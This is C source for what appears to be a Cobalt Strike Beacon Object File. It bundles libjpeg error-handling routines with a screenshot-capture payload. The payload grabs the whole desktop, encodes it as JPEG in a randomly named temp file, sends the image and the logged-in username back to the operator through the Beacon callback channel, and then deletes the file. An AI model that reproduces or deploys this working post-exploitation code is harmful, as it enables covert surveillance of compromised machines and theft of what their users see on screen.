METHODDEF(void)
format_message (j_common_ptr cinfo, char * buffer)
{
  struct jpeg_error_mgr * err = cinfo->err;
  int msg_code = err->msg_code;
  const char * msgtext = NULL;
  const char * msgptr;
  char ch;
  boolean isstring;

  /* Look up message string in proper table */
  if (msg_code > 0 && msg_code <= err->last_jpeg_message) {
    msgtext = err->jpeg_message_table[msg_code];
  } else if (err->addon_message_table != NULL &&
	     msg_code >= err->first_addon_message &&
	     msg_code <= err->last_addon_message) {
    msgtext = err->addon_message_table[msg_code - err->first_addon_message];
  }

  /* Defend against bogus message number */
  if (msgtext == NULL) {
    err->msg_parm.i[0] = msg_code;
    msgtext = err->jpeg_message_table[0];
  }

  /* Check for string parameter, as indicated by %s in the message text */
  isstring = FALSE;
  msgptr = msgtext;
  while ((ch = *msgptr++) != '\0') {
    if (ch == '%') {
      if (*msgptr == 's') isstring = TRUE;
      break;
    }
  }

  /* Format the message into the passed buffer */
  if (isstring)
    sprintf(buffer, msgtext, err->msg_parm.s);
  else
    sprintf(buffer, msgtext,
	    err->msg_parm.i[0], err->msg_parm.i[1],
	    err->msg_parm.i[2], err->msg_parm.i[3],
	    err->msg_parm.i[4], err->msg_parm.i[5],
	    err->msg_parm.i[6], err->msg_parm.i[7]);
}


/*
 * Reset error state variables at start of a new image.
 * This is called during compression startup to reset trace/error
 * processing to default state, without losing any application-specific
 * method pointers.  An application might possibly want to override
 * this method if it has additional error processing state.
 */

METHODDEF(void)
reset_error_mgr (j_common_ptr cinfo)
{
  cinfo->err->num_warnings = 0;
  /* trace_level is not reset since it is an application-supplied parameter */
  cinfo->err->msg_code = 0;	/* may be useful as a flag for "no error" */
}


/*
 * Fill in the standard error-handling methods in a jpeg_error_mgr object.
 * Typical call is:
 *	struct jpeg_compress_struct cinfo;
 *	struct jpeg_error_mgr err;
 *
 *	cinfo.err = jpeg_std_error(&err);
 * after which the application may override some of the methods.
 */

GLOBAL(struct jpeg_error_mgr *)
jpeg_std_error (struct jpeg_error_mgr * err)
{
  err->error_exit = error_exit;
  err->emit_message = emit_message;
  err->output_message = output_message;
  err->format_message = format_message;
  err->reset_error_mgr = reset_error_mgr;

  err->trace_level = 0;		/* default = no tracing */
  err->num_warnings = 0;	/* no warnings emitted yet */
  err->msg_code = 0;		/* may be useful as a flag for "no error" */

  /* Initialize message table pointers */
  err->jpeg_message_table = jpeg_std_message_table;
  err->last_jpeg_message = (int) JMSG_LASTMSGCODE - 1;

  err->addon_message_table = NULL;
  err->first_addon_message = 0;	/* for safety */
  err->last_addon_message = 0;

  return err;
}



/*
bmp2jpeg.c
convert bmp raw binary to jpeg format
*/

#include <setjmp.h>
#include <string.h>

BOOL bmp2jpeg(const char* jpg_path, uint8_t* bmp_bytes, size_t bmp_size, int width, int height, int quality)
{
    struct jpeg_compress_struct cinfo;
    struct jpeg_error_mgr jerr;
    FILE * out_jpg_file;
    JSAMPROW row_pointer[1];
    int row_stride;

    if ((out_jpg_file = fopen(jpg_path, "wb")) == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "can't open jpg %s", jpg_path);
        return FALSE;
    }

    cinfo.err = jpeg_std_error(&jerr);
    jpeg_create_compress(&cinfo);
    jpeg_stdio_dest(&cinfo, out_jpg_file);

    cinfo.image_width = width;
    cinfo.image_height = height;
    cinfo.input_components = 3;
    cinfo.in_color_space = JCS_RGB;

    jpeg_set_defaults(&cinfo);
    jpeg_set_quality(&cinfo, quality, TRUE);
    jpeg_start_compress(&cinfo, TRUE);

    row_stride = width * 3;
    while (cinfo.next_scanline < cinfo.image_height) {
        //因为bmp图像的数据存储格式是从左下到右上，若直接处理生成的图像是倒的，所以这儿需要从下往上处理图像 
        //row_pointer[0] = & image_buffer[cinfo.next_scanline * row_stride];
        row_pointer[0] = & bmp_bytes[(cinfo.image_height-cinfo.next_scanline-1) * row_stride];
        // BMP BGR -> JPEG RGB
        for (int i = 0, j = row_stride - 3; i < j; i+=3) {
            uint8_t t = row_pointer[0][i];
            row_pointer[0][i] = row_pointer[0][i+2];
            row_pointer[0][i+2] = t;
        }
        jpeg_write_scanlines(&cinfo, row_pointer, 1);
    }

    jpeg_finish_compress(&cinfo);
    fclose(out_jpg_file);
    jpeg_destroy_compress(&cinfo);

    return TRUE;
}

int get_screen_size(HDC dc, DWORD* width, DWORD* height)
{
    BITMAP all_desktops;
    HGDIOBJ bitmap = GetCurrentObject(dc, OBJ_BITMAP);
    GetObjectW(bitmap, sizeof(BITMAP), &all_desktops);

    *width = all_desktops.bmWidth;
    *height = all_desktops.bmHeight;
    DeleteObject(bitmap);
    return 1;
}

#if BOF_TEST_MODE == 0
void post_screenshot(void* data, int length)
{
    formatp fmt;
    char buf[128];
    int sessid = 1;
    const char* username;

    BeaconFormatAlloc(&fmt, length + 16 + 256);
    // image data
    BeaconFormatAppend(&fmt, &length, sizeof(int));
    BeaconFormatAppend(&fmt, data, length);
    // session id
    BeaconFormatAppend(&fmt, &sessid, sizeof(int));
    // title
    length = 3;
    BeaconFormatAppend(&fmt, &length, sizeof(int));
    BeaconFormatAppend(&fmt, "bof", 3);
    // user name
    DWORD cb = 128;
    if (GetUserNameA(buf, &cb) && cb > 1) {
        length = cb - 1;
        username = buf;
    }
    else {
        length = 4;
        username = "none";
    }
    BeaconFormatAppend(&fmt, &length, sizeof(int));
    BeaconFormatAppend(&fmt, (void*)username, length);

    data = BeaconFormatToString(&fmt, &length);
    BeaconOutput(CALLBACK_SCREENSHOT, data, length);

    BeaconFormatFree(&fmt);
}

void upload_screenshot(const char* path)
{
    char* data;
    int length;
    FILE* img;

    img = fopen(path, "rb");
    if (!img) {
        goto _END;
    }

    fseek(img, 0, SEEK_END);
    length = ftell(img);
    fseek(img, 0, SEEK_SET);
    if (length == 0) {
        goto _END;
    }

    data = malloc(length);
    if (!data) {
        goto _END;
    }

    fread(data, 1, length, img);
    post_screenshot(data, length);

_END:
    if (img) {
        fclose(img);
        DeleteFileA(path);
    }
    if (data)
        free(data);
}

#endif

int get_temp_path(char* buf, int length)
{
    const char* map = "0123456789abcdefghijklmnopqrstuvwxyz";
    char name[18] = "%TEMP%";
    name[6] = '\\';
    srand(time(0));
    for (int i = 7; i < 18; ++i) {
        name[i] = map[(rand() % 36)];
    }
    name[17] = 0;
    length = ExpandEnvironmentStringsA(name, buf, length);
    memset(name, 0, sizeof(name));
    return length;
}

void take_screenshot(const char* path, int quality)
{
    BITMAPINFO info;
    HBITMAP bitmap = NULL;
    HDC dc = 0, mem_dc = NULL;
    DWORD width = 0, height = 0;
    uint8_t *bits = NULL;
    DWORD cbits = 0;
    char buf[256];

    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    memset(&info, 0, sizeof(BITMAPINFO));

    dc = GetDC(NULL);
    if (!dc) {
        BeaconPrintf(CALLBACK_ERROR, "could not get DC: %lu", GetLastError());
        return;
    }

    if (!get_screen_size(dc, &width, &height)) {
        BeaconPrintf(CALLBACK_ERROR, "could not get size of screen: %lu", GetLastError());
        goto _END;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "screen: width=%lu, height=%lu", width, height);

    info.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    info.bmiHeader.biBitCount = 24;
    info.bmiHeader.biCompression = BI_RGB;
    info.bmiHeader.biPlanes = 1;
    info.bmiHeader.biWidth = width;
    info.bmiHeader.biHeight = height;

    cbits = (((24 * width + 31)&~31) / 8) * height;

    mem_dc = CreateCompatibleDC(dc);
    bitmap = CreateDIBSection(dc, &info, DIB_RGB_COLORS, (VOID **)&bits, NULL, 0);
    SelectObject(mem_dc, bitmap);
    BitBlt(mem_dc, 0, 0, width, height, dc, x, y, SRCCOPY);

    if (!bits) {
        BeaconPrintf(CALLBACK_ERROR, "bits is nullptr: %lu", GetLastError());
        goto _END;
    }

    if (path == NULL) {
        if (get_temp_path(buf, 256) == 0) {
            BeaconPrintf(CALLBACK_ERROR, "could not get temp path: %lu", GetLastError());
        }
        path = buf;
    }

    if (bmp2jpeg(path, bits, cbits, width, height, quality)) {
#if BOF_TEST_MODE
        printf("screenshot image saved to %s\n", path);
#else
        upload_screenshot(path);
#endif
    }

_END:
    if (mem_dc)
        DeleteDC(mem_dc);
    if (dc)
        ReleaseDC(NULL, dc);
    if (bitmap)
        DeleteObject(bitmap);
}

#if BOF_TEST_MODE
int main(int argc, char** argv)
{
    const char* save_to = NULL;
    int quality = 200;

    if (argc > 1) {
        save_to = argv[1];
    }
    if (argc > 2) {
        quality = atoi(argv[2]);
    }
    take_screenshot(save_to, quality);
}
#else
void go(char* arg, int alen)
{
    datap p;
    int quality = atoi(arg);

    if (quality < 10 || quality > 100) {
        quality = 50;
    }

    //BeaconDataParse(&p, arg, alen);
    //quality = BeaconDataInt(&p);
    take_screenshot(NULL, quality);
}
#endif
